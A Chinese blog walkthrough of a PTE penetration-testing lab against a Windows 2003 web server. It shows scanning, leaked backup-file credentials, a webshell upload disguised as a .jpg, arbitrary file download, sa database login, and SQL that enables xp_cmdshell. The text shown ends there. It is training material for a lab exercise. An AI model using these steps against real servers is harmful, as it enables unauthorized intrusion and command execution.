@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8"/>
+    <meta name="viewport" content="initial-scale=1.0, width=device-width"/>
+    <title>
+      
+        PTE-2003 | Blanks'Blog
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/apple-touch-icon.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/favicon-32x32.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/favicon-16x16.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/logo.svg"
+            color=""/>
+    
+    
+    
+      
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/regular.ttf);
+        font-weight: regular;
+    }
+  </style>
+
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/bold.ttf);
+        font-weight: bold;
+    }
+  </style>
+
+
+    
+    <link rel="stylesheet"
+          type="text/css"
+          href='/css/layout.css'/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css" />
+  
+
+  <meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href='/' class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/logo.svg"/>
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E5%AD%A6%E4%B9%A0">Notes</a>
+            
+          
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner--toc">
+      <div class="post-content__head">
+        <div class="post-title">PTE-2003</div>
+        <div class="post-info">
+          
+  <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-tag">#渗透测试</a><a href="/tags/PTE%E9%9D%B6%E5%9C%BA/" class="post-tag">#PTE靶场</a>
+
+
+          <span class="post-date">2023-03-10</span>
+        </div>
+      </div>
+      
+        <aside class="toc-outer">
+          <div class="toc-title">目录</div>
+          <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">二层发现</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">web入口</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text"></span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">目录扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">web 备份文件</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">文件上传</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">连接shell</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">文件包含</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">管理员权限 + 开启 3389 端口</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">连接sql server</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">关闭防火墙</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">开启RDP 远程连接</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">创建用户 + 添加到管理员组</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">mstsc 远程连接</span></a></li></ol>
+          <a href="#" class="toc-top">回到顶部</a>
+        </aside>
+      
+      <div class="post-content__body">
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <meta name="referrer" content="no-referrer">
+
+<p>先查看本地局域网的IP地址<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670045209927-fe937b0a-349a-4e0f-9145-01d43178510e.png#averageHue=%23303746&clientId=u883e7dfe-10b9-4&from=paste&height=313&id=uaaaabd75&originHeight=313&originWidth=818&originalType=binary&ratio=1&rotation=0&showTitle=false&size=105900&status=done&style=none&taskId=u4298bb03-94e4-4ca3-8ac7-603f4b57939&title=&width=818" alt="image.png"><br>使用arp-scan 进行二层发现<br><a name="rdZmT"></a></p>
+<h1><span id="二层发现">二层发现</span></h1><p><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670045278140-7ac81869-3a5e-4b38-97ce-7d59226c84fc.png#averageHue=%23262d3d&clientId=u883e7dfe-10b9-4&from=paste&height=185&id=u1f6a285f&originHeight=185&originWidth=855&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61848&status=done&style=none&taskId=ua43121bc-12b9-48ff-99f0-8a94f554432&title=&width=855" alt="image.png"><br>目标主机 192.168.100.13<br>对目标主机进行扫描发现端口 服务 </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">nmap -sV -O -p <span class="hljs-number">1</span>-<span class="hljs-number">65535</span> <span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.13</span><br></code></pre></td></tr></table></figure>
+<p>由于这里是第二遍 我已经开启了3389 端口 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670045683031-b3a02d98-f3c2-4885-8cec-a6aea07294ca.png#averageHue=%23262e3c&clientId=u883e7dfe-10b9-4&from=paste&height=393&id=uaacfb05e&originHeight=393&originWidth=1135&originalType=binary&ratio=1&rotation=0&showTitle=false&size=153676&status=done&style=none&taskId=u451599c7-912a-4239-a367-b62a57bb10f&title=&width=1135" alt="image.png"><br>那从没有开启的3389 的端口来说  <br>根据信息 可以了解到的内容大概有 <br>445 端口  1433 端口 sql server   27689 端口 http<br>可以看出的信息还有是一台 2003 的主机 开启了sql server 服务器 和 http 服务器</p>
+<p>从渗透的角度来说  第一步肯定是去看一下 http服务器  和 msf  去打一下 毕竟主机很老了 可以使用msfconf 08_067<br>但是这里要获取key值 <br>这里先从web层面进行入手</p>
+<p><a name="XGpCo"></a></p>
+<h1><span id="web入口">web入口</span></h1><p><a name="qS1ms"></a></p>
+<h1><span id><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670046329723-23686ca6-2cf0-4cf6-a0ba-330812d18487.png#averageHue=%23fdf9f7&clientId=uc97bafc7-c7fa-4&from=paste&height=847&id=ubd0b8981&originHeight=847&originWidth=1627&originalType=binary&ratio=1&rotation=0&showTitle=false&size=162012&status=done&style=none&taskId=ue30c264b-7680-4e20-a592-b9f756e9fcc&title=&width=1627" alt="image.png"></span></h1><p>是这么一个界面 <br>文件上传下载系统 <br>输入admin   密码 123456<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670046391326-8ff9c3eb-ac43-41a0-b9d4-7e3252d0cf11.png#averageHue=%23fefefe&clientId=uc97bafc7-c7fa-4&from=paste&height=501&id=u0847dc91&originHeight=501&originWidth=1769&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30770&status=done&style=none&taskId=uf2bdd215-ef7c-4072-816a-5ab10f73cfe&title=&width=1769" alt="image.png"><br>提示密码错误 可能存在弱口令<br>BURP 抓包发送到intruder模块<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670046600725-1ff26a6e-4f8a-432b-bd2a-0efa020bffc8.png#averageHue=%23f7f5f5&clientId=uc97bafc7-c7fa-4&from=paste&height=575&id=u70a2f348&originHeight=575&originWidth=1180&originalType=binary&ratio=1&rotation=0&showTitle=false&size=118275&status=done&style=none&taskId=u6e169762-cecd-44bc-a51d-d93836bd4e5&title=&width=1180" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670046779311-473e80c1-f4f8-466a-8139-066c3a0ac7a3.png#averageHue=%23f8f7f6&clientId=uc97bafc7-c7fa-4&from=paste&height=738&id=u81fc6ba1&originHeight=738&originWidth=1592&originalType=binary&ratio=1&rotation=0&showTitle=false&size=135698&status=done&style=none&taskId=u8d8443db-94d7-406c-b29a-885998fc0a3&title=&width=1592" alt="image.png"><br>尝试爆破密码无果  <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670046765651-d30286c5-eac5-45e6-a975-2b07cf4778f3.png#averageHue=%23faf6f4&clientId=uc97bafc7-c7fa-4&from=paste&height=942&id=u5c22b3a7&originHeight=942&originWidth=1204&originalType=binary&ratio=1&rotation=0&showTitle=false&size=103243&status=done&style=none&taskId=ud52f5480-408b-407e-8675-84652374783&title=&width=1204" alt="image.png"></p>
+<p><a name="xTu6K"></a></p>
+<h1><span id="目录扫描">目录扫描</span></h1><p><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670047034942-1d8034ca-4343-4521-802a-64b62890a3e6.png#averageHue=%230b0b0e&clientId=uc97bafc7-c7fa-4&from=paste&height=912&id=u64d4e03a&originHeight=912&originWidth=1214&originalType=binary&ratio=1&rotation=0&showTitle=false&size=93894&status=done&style=none&taskId=u8bbbe1a3-d68f-45a9-ae60-15cc2a4974e&title=&width=1214" alt="image.png"><br>在扫描的时候去看一下 robots.txt 文件  <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670047020329-2aafce32-71a0-404f-94bf-fceadeb74d24.png#averageHue=%23fefdfc&clientId=uc97bafc7-c7fa-4&from=paste&height=361&id=uc4ff749a&originHeight=361&originWidth=1101&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18449&status=done&style=none&taskId=u0afbdf05-15d3-4ee1-b146-b14bfd6e129&title=&width=1101" alt="image.png"><br>存在 admin 目录  和 upfile 目录<br>拼接在后面进行查看<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670047143449-b64dc04a-65bf-4d5c-abfb-8f6c8a96fa75.png#averageHue=%23faf9f7&clientId=uc97bafc7-c7fa-4&from=paste&height=351&id=ua81e88f5&originHeight=351&originWidth=1098&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28818&status=done&style=none&taskId=u5657c1ec-c7ea-46d1-a5a7-807e3ba54dd&title=&width=1098" alt="image.png"><br>两个目录都被拒绝访问 可能是还需要拼接后面的目录内容<br>现在在返回去看一下扫描结果<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670047222654-c4e631b8-04e3-425c-a2e9-1dd95a908483.png#averageHue=%230b0c10&clientId=uc97bafc7-c7fa-4&from=paste&height=742&id=ua5242526&originHeight=742&originWidth=886&originalType=binary&ratio=1&rotation=0&showTitle=false&size=77645&status=done&style=none&taskId=u8c1f708b-891d-4e1b-9886-650cb7c9b68&title=&width=886" alt="image.png"><br>第一步扫描存在200 的目录文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"> /admin/admin.aspx<br>/js/config.js<br> /robots.txt<br>/web.config.bak<br></code></pre></td></tr></table></figure>
+<p>这里有一个备份文件 感觉很重要 <br>一般网站存在的备份文件都很重要 <br>先一个个进行尝试 访问<br>结果<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670047640575-820faa91-a6e6-43e8-a6fb-e3809041075b.png#averageHue=%23fdfcfa&clientId=uc97bafc7-c7fa-4&from=paste&height=226&id=uae7705b8&originHeight=226&originWidth=807&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16036&status=done&style=none&taskId=u4c17fd92-55cf-4ab1-98dc-2a678ab0c27&title=&width=807" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670047648571-0e3e8c6f-ed37-4e55-ae48-14546ddc5c90.png#averageHue=%23fcfcfb&clientId=uc97bafc7-c7fa-4&from=paste&height=365&id=ue6a2a186&originHeight=365&originWidth=1023&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21176&status=done&style=none&taskId=u86891698-0ff1-4c6b-951d-c50b887bf28&title=&width=1023" alt="image.png"><br>无果 <br>访问一下备份文件<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670047675213-71f00286-67a9-4ac0-906e-58505b364cfd.png#averageHue=%23fefefd&clientId=uc97bafc7-c7fa-4&from=paste&height=1022&id=u737bcf84&originHeight=1022&originWidth=1250&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31529&status=done&style=none&taskId=uf44f044f-5529-4474-8684-93e17a3d586&title=&width=1250" alt="image.png"><br><a name="bHo4j"></a></p>
+<h2><span id="web-备份文件">web 备份文件</span></h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670047726972-ad770170-df78-4e64-a7a0-42914aa35006.png#averageHue=%23282922&clientId=uc97bafc7-c7fa-4&from=paste&height=971&id=u20db8c5d&originHeight=971&originWidth=1571&originalType=binary&ratio=1&rotation=0&showTitle=false&size=112884&status=done&style=none&taskId=ua8f2cb7d-ced4-47fa-8253-a1c3f71319a&title=&width=1571" alt="image.png"><br>这是数据库 的信息 这里存在一个pwd 密码<br>这里进行连接数据库 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670048000983-3a11eebe-6ee4-49f8-962e-85b85c31295b.png#averageHue=%23f4f4f4&clientId=uc97bafc7-c7fa-4&from=paste&height=796&id=uf35b6121&originHeight=796&originWidth=994&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75149&status=done&style=none&taskId=u6179978f-c310-4b4b-a094-d5e43b759d5&title=&width=994" alt="image.png"><br>存在一个userlists 的表 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670048067922-cefce966-5036-4585-a14e-35134a348f39.png#averageHue=%23fbfbfa&clientId=uc97bafc7-c7fa-4&from=paste&height=683&id=u3e365580&originHeight=683&originWidth=1439&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63544&status=done&style=none&taskId=u08cc2451-9697-413d-9c19-7c42c230428&title=&width=1439" alt="image.png"><br>这里存在一个密码 admin 用户的 那这不就可以登录web 端了 快去尝试</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">admin<br>asdadwn_d2112<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670048185207-0eb0b8c6-ca6f-45b7-949b-fefc3cf6b5e8.png#averageHue=%23fcfcfb&clientId=uc97bafc7-c7fa-4&from=paste&height=557&id=u4ce93a68&originHeight=557&originWidth=1507&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48867&status=done&style=none&taskId=ud90b02a9-a859-496b-a531-15aa8ac04e8&title=&width=1507" alt="image.png"><br>登录成功 发现第一个key1 值 <br>登录到网页的第一点<br>就是查看网页的功能点有多少 才能测试有什么漏洞<br>这里的功能点 有 上传文件  添加用户  <br>可能存在的漏洞有xss  文件上传  越权等操作<br>当然我们这里的目标是getshell<br><a name="oTCbq"></a></p>
+<h1><span id="文件上传">文件上传</span></h1><p>主要查看文件上传<br>可以看出 这个网页是用aspx 写的 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670048423400-fe02a9bc-b067-4552-88c9-501a49097f04.png#averageHue=%23fdfcfc&clientId=uc97bafc7-c7fa-4&from=paste&height=661&id=u08045962&originHeight=661&originWidth=1915&originalType=binary&ratio=1&rotation=0&showTitle=false&size=88247&status=done&style=none&taskId=u8a1acc09-c58c-4a47-8c21-14acdf06d2d&title=&width=1915" alt="image.png"><br>这里上传aspx 的一句话上去<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683208450132-eb10716f-a8f2-4bac-9731-e061ea30b92c.png#averageHue=%23161719&clientId=ud8754796-3ae9-4&from=paste&height=74&id=u79792d7a&originHeight=74&originWidth=1052&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12529&status=done&style=none&taskId=u6926ae7e-24e4-484d-a4ca-8d024bbf80c&title=&width=1052" alt="image.png"><br>这里有限制不能上传 aspx的文件 <br>根据他这里上传的文件 来看 还要看注意<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670048603810-27064933-8403-4e4b-9a23-524a0b7a4e2b.png#averageHue=%23dab26d&clientId=uc97bafc7-c7fa-4&from=paste&height=211&id=u66b2615c&originHeight=211&originWidth=1396&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24846&status=done&style=none&taskId=uc7e72976-e27b-4eea-8371-4a2f249de91&title=&width=1396" alt="image.png"><br>不能上传文件名过长  上传的jpg文件 <br>文件名过长会被系统截取包括系统时间在内的前32位字符作为文件名，请上传的文件名称不要过长，<br>这里可能是白名单 <br>png 都不可以 <br>jpg 是可以上传上去的<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670048698192-024b9ad8-edae-4ff4-b94b-c9992b657ef5.png#averageHue=%23e5c581&clientId=uc97bafc7-c7fa-4&from=paste&height=432&id=ud7372fdc&originHeight=432&originWidth=1671&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53419&status=done&style=none&taskId=u2073a0c1-4a07-448e-95fd-98499e04bb6&title=&width=1671" alt="image.png"><br>但是这样连接不了可能 这么名字限制了上传一个 bbbbbbbb.aspx.jpg<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670048889774-cbdfc1b1-a148-4718-b728-e9fb00114785.png#averageHue=%23fcfcfb&clientId=uc97bafc7-c7fa-4&from=paste&height=401&id=u57d7ea4e&originHeight=401&originWidth=1725&originalType=binary&ratio=1&rotation=0&showTitle=false&size=47795&status=done&style=none&taskId=ud3707377-1128-4f0d-a835-08f4759f385&title=&width=1725" alt="image.png"><br>上传成功<br><a name="Xoxe8"></a></p>
+<h1><span id="连接shell">连接shell</span></h1><p><a target="_blank" rel="noopener" href="http://192.168.100.13:27689/admin/file_down.aspx?file=638056744815740892-bbbbbbbb.aspx">http://192.168.100.13:27689/admin/file_down.aspx?file=638056744815740892-bbbbbbbb.aspx</a><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670049062963-d12e2d4a-c3e1-4856-9e6b-78ee55c964d4.png#averageHue=%23fefefd&clientId=uc97bafc7-c7fa-4&from=paste&height=739&id=u9b6b65a3&originHeight=739&originWidth=1457&originalType=binary&ratio=1&rotation=0&showTitle=false&size=56586&status=done&style=none&taskId=u10927dd0-aad3-48d3-a0b4-27fc31a5435&title=&width=1457" alt="image.png"><br>这个是连接不了的 这个系统叫做文件上传下载系统  这是一个下载链接 <br>一开始就发现一个upfile目录接着去扫描一下 upfile<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670049366423-51d7f797-278e-4126-a442-7b47e82f9bd0.png#averageHue=%230a0b0d&clientId=uc97bafc7-c7fa-4&from=paste&height=500&id=u0c40197e&originHeight=500&originWidth=963&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39116&status=done&style=none&taskId=ufd010769-36a3-497a-b17e-47a35fd8139&title=&width=963" alt="image.png"><br>现在找不到文件储存路径<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670049614188-41207ef9-0808-4369-91de-4bbd81628b53.png#averageHue=%23f7f4e7&clientId=uc97bafc7-c7fa-4&from=paste&height=632&id=uc8c89dd6&originHeight=632&originWidth=1079&originalType=binary&ratio=1&rotation=0&showTitle=false&size=91590&status=done&style=none&taskId=u49634a6b-68ae-4069-8056-ca5ef568246&title=&width=1079" alt="image.png"><br>扫描不到<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670049637893-08619f84-b2d9-4900-aaa6-fa788aad3624.png#averageHue=%230a0b0d&clientId=uc97bafc7-c7fa-4&from=paste&height=567&id=ud2209019&originHeight=567&originWidth=974&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43682&status=done&style=none&taskId=ucd9e52ce-5372-4d79-8047-453bfac8f21&title=&width=974" alt="image.png"><br>还有一个admin目录 <br>去扫描一下<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670049854657-daf3ed8f-41a1-4745-a40c-3cb32d9bb80b.png#averageHue=%230b0b0d&clientId=uc97bafc7-c7fa-4&from=paste&height=629&id=u33bae5f8&originHeight=629&originWidth=918&originalType=binary&ratio=1&rotation=0&showTitle=false&size=51063&status=done&style=none&taskId=u36410422-b0a9-4aaa-9f7b-99dce14aeaa&title=&width=918" alt="image.png"><br>admin 目录存在 比较多的文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">[<span class="hljs-number">14</span>:<span class="hljs-number">41</span>:<span class="hljs-number">19</span>] Starting:<br>[<span class="hljs-number">14</span>:<span class="hljs-number">41</span>:<span class="hljs-number">44</span>] <span class="hljs-number">200</span> -  415B  - /admin/ADMIN.aspx<br>[<span class="hljs-number">14</span>:<span class="hljs-number">41</span>:<span class="hljs-number">44</span>] <span class="hljs-number">200</span> -  415B  - /admin/Admin.aspx<br>[<span class="hljs-number">14</span>:<span class="hljs-number">41</span>:<span class="hljs-number">52</span>] <span class="hljs-number">403</span> -    3KB - /admin/Trace.axd<br>[<span class="hljs-number">14</span>:<span class="hljs-number">41</span>:<span class="hljs-number">55</span>] <span class="hljs-number">500</span> -    4KB - /admin/WebResource.axd?d=LER8t9aS<br>[<span class="hljs-number">14</span>:<span class="hljs-number">41</span>:<span class="hljs-number">56</span>] <span class="hljs-number">403</span> -   32B  - /admin/\..\..\..\..\..\..\..\..\..\etc\passwd<br>[<span class="hljs-number">14</span>:<span class="hljs-number">42</span>:04] <span class="hljs-number">200</span> -  415B  - /admin/admin.aspx<br>[<span class="hljs-number">14</span>:<span class="hljs-number">42</span>:<span class="hljs-number">51</span>] <span class="hljs-number">200</span> -   21B  - /admin/file_upload.aspx<br>[<span class="hljs-number">14</span>:<span class="hljs-number">42</span>:<span class="hljs-number">58</span>] <span class="hljs-number">301</span> -  161B  - /admin/img  -&gt;  http://<span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.13</span>:<span class="hljs-number">27689</span>/admin/img/<br></code></pre></td></tr></table></figure>
+<p>结果还是无果<br><a name="uZGWm"></a></p>
+<h2><span id="文件包含">文件包含</span></h2><p>在去看一下下载文件 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670050012768-fef17215-f840-4d13-9ec8-f17495f6b2cd.png#averageHue=%23fefefd&clientId=uc97bafc7-c7fa-4&from=paste&height=742&id=u2c5bdeb6&originHeight=742&originWidth=1653&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59620&status=done&style=none&taskId=u727d226a-f5b3-4104-995e-88fea6ad849&title=&width=1653" alt="image.png"><br><a target="_blank" rel="noopener" href="http://192.168.100.13:27689/admin/file_down.aspx?file=">http://192.168.100.13:27689/admin/file_down.aspx?file=</a><br>这后面接的是要下载的文件名<br>然后我如果输入一个不存在的文件呢 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670050117900-d1a8b877-0d75-4121-9a20-c396012fe60b.png#averageHue=%23f9f7e3&clientId=uc97bafc7-c7fa-4&from=paste&height=878&id=ueda53a67&originHeight=878&originWidth=1574&originalType=binary&ratio=1&rotation=0&showTitle=false&size=141733&status=done&style=none&taskId=u762d4512-00e4-409e-b20c-3104040c37a&title=&width=1574" alt="image.png"><br>报错了  更好的是找的了文件存储路径 <br>_未能找到文件“D:\web\upfile\affix_<br>_现在可以去连接shell 了 _<br>_但是我这种地方有file 函数 _<br><em>存在file函数  ，就说明可能存在文件包含 ，文件读取漏洞，任意文件下载</em><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670050340176-aaf6e64f-f2dd-409b-893b-58e1a33baacd.png#averageHue=%23f8f6e1&clientId=uc97bafc7-c7fa-4&from=paste&height=1033&id=uc1308e78&originHeight=1033&originWidth=1357&originalType=binary&ratio=1&rotation=0&showTitle=false&size=143105&status=done&style=none&taskId=ud45af1e8-ff35-4677-8eda-ffd94ef4e35&title=&width=1357" alt="image.png"><br>刚好存在任意文件下载<br>好了该去连接shell 了 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670050425068-d359ec29-0b7b-47fc-a2c8-51e785ae904e.png#averageHue=%23ebebeb&clientId=uc97bafc7-c7fa-4&from=paste&height=636&id=u52790441&originHeight=636&originWidth=868&originalType=binary&ratio=1&rotation=0&showTitle=false&size=70044&status=done&style=none&taskId=u1d77e3b7-f76c-46c0-a026-1b83852b538&title=&width=868" alt="image.png"><br>连接成功<br>找到k2<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670050655946-25b7d718-7478-469d-9939-ea5521f251b5.png#averageHue=%23f3f3f3&clientId=uc97bafc7-c7fa-4&from=paste&height=990&id=u9184985f&originHeight=990&originWidth=1007&originalType=binary&ratio=1&rotation=0&showTitle=false&size=83713&status=done&style=none&taskId=u8f78f1d5-f19d-4f42-857b-05a3f241797&title=&width=1007" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670050640331-b71edb24-db58-4bd2-9266-c5998fca310d.png#averageHue=%23f9f9f9&clientId=uc97bafc7-c7fa-4&from=paste&height=587&id=u52bd49b2&originHeight=587&originWidth=819&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15437&status=done&style=none&taskId=uc9552a44-c0e3-4cb6-bb98-fa0dfbc7704&title=&width=819" alt="image.png"></p>
+<p><a name="tNz2X"></a></p>
+<h1><span id="管理员权限-开启-3389-端口">管理员权限 + 开启 3389 端口</span></h1><p>寻找还有什么有用的信息<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670065757800-3c5ce35f-0887-4962-bfea-a60a4751db5c.png#averageHue=%23282828&clientId=uc97bafc7-c7fa-4&from=paste&height=596&id=uef8c4e30&originHeight=596&originWidth=989&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33147&status=done&style=none&taskId=u78dc0f76-3878-411b-a7e1-657e7962ebb&title=&width=989" alt="image.png"></p>
+<p>这里有三个web.config 文件 有点可疑 <br>前面两个是一样的 可以被扫描出来和任意文件下载 出来的<br>那打开第三个 看看<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670065872083-ccf38e69-e686-4711-875d-2382ea312daa.png#averageHue=%23fbfaf9&clientId=uc97bafc7-c7fa-4&from=paste&height=721&id=u6f1b15b9&originHeight=721&originWidth=1207&originalType=binary&ratio=1&rotation=0&showTitle=false&size=98567&status=done&style=none&taskId=udc7a8e16-5c08-4f5a-8721-7a810544314&title=&width=1207" alt="image.png"><br>他的id 是sa   pwd   cisp-pte@sa  database&#x3D;FileManage<br><a name="p1ux0"></a></p>
+<h2><span id="连接sql-server">连接sql server</span></h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670066024059-3dec307f-a89c-4a02-b67b-427c0551de43.png#averageHue=%23f4f3f3&clientId=uc97bafc7-c7fa-4&from=paste&height=748&id=uaa3e5fe9&originHeight=748&originWidth=804&originalType=binary&ratio=1&rotation=0&showTitle=false&size=67275&status=done&style=none&taskId=u990844df-edf7-45d2-88ac-e73a6d100ad&title=&width=804" alt="image.png"><br>连接成功<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670066061995-9346dd99-7d82-47f5-a50e-9ca537d3018e.png#averageHue=%23fbfbfa&clientId=uc97bafc7-c7fa-4&from=paste&height=538&id=uac054bd3&originHeight=538&originWidth=917&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31349&status=done&style=none&taskId=u432ebc02-cfbb-4bce-aae2-536b15a529e&title=&width=917" alt="image.png"></p>
+<p>这里查看一下sa 用户的权限<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670066348692-81d9bed2-633e-422d-ab1d-3b9374eb1323.png#averageHue=%23fbfbfb&clientId=uc97bafc7-c7fa-4&from=paste&height=615&id=ua4e88ba7&originHeight=615&originWidth=1072&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24490&status=done&style=none&taskId=u8a6fc3a1-02eb-4fcc-822e-fe2b73e1027&title=&width=1072" alt="image.png"></p>
+<p>可以看出已经执行了sql 语句 并且是system 权限<br><a name="JZGKW"></a></p>
+<h2><span id="关闭防火墙">关闭防火墙</span></h2><p>开启 cmd_shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">use master;<br><span class="hljs-built_in">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">1</span>;<br>RECONFIGURE;<br><br>EXEC sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>,<span class="hljs-number">1</span>;<br>RECONFIGURE;<br></code></pre></td></tr></table></figure>
